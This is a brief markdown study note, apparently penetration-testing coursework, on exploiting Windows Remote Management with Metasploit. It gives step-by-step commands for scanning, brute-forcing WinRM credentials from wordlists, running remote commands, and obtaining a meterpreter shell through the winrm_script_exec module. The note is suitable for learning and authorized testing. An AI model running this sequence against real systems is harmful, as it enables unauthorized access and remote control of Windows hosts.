* Windows Remote Management protocol.
* **Uses**
  * Remotely access and interact with Windows hosts on a local network or on Internet
  * Manage and configure Windows systems remotely
 
* Typically uses TCP port 5985 and 5986 (HTTPS)

* **How to exploit**
  * USe MSF to identify WinRM users and passwords.
  * Also to obtain a meterpreter session on the target.
 
* PRACTICAL
* `service postgresql start && msfconsole`
* `workspace -a [name]`
* `db_nmap -sS -sV -O [IP]`
* `services` --> To see the services running on the target and see which of these can be exploited
* `search type:auxiliary winrm`
* `use auxiliary/scanner/winrm/winrm_auth_methods`
* `set rhosts [IP]`
* `run` --> This will give the authentication methods used on the target
* ***
* `search winrm_login`
* `use auxiliary/scanner/winrm/winrm_login`
* set rhosts, user_file and pass_file
* `run`
* ***
* `search winrm_cmd`
* `use auxiliary/scanner/winrm/winrm_cmd`
* `set username [username obtained from the previous step]`
* `set password [password]`
* `set CMD whoami`
* `run` --> This should tell the level of privilege we have on the target system
* ***
* **To obtain a meterpreter session**
* `use exploit/windows/winrm/winrm_script_exec`
* `set username [user]`
* `set password [pass]`
* `set force_vbs true` --> This will force the module to use the VBS Cmd Stager instead of Power shell Cmd stager.
* `run`
